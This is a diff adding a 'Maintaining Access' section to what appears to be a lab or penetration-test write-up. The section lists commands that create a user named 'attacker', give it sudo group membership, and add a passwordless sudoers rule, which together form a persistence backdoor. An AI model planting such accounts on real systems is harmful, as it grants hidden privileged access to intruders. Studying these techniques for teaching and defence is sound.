@@ -20,3 +20,17 @@ After gaining access to the server using ssh, we played around with the server l
 ## Security Goal Violations
 
 ## Maintaining Access
+
+After we got root access we wanted to make sure that we maintained access. We did this by running the following commands:
+`sudo useradd attacker`
+This commands uses super user privileges to create a new user called attacker with super user access
+`sudo passwd attacker`
+This command creates a password for the user of attacker that only we will know
+`sudo usermod -aG sudo attacker`
+Which adds the user attacker to the group sudo such that attacker now have the privileges of the sudo group
+
+After these steps we used the command
+`sudo visudo`
+to open /etc/sudoers where we added the following line:
+`attacker ALL=(ALL:ALL) NOPASSWD: ALL`
+which ensures that we can use sudo commands on the user attacker without having to write root’s password
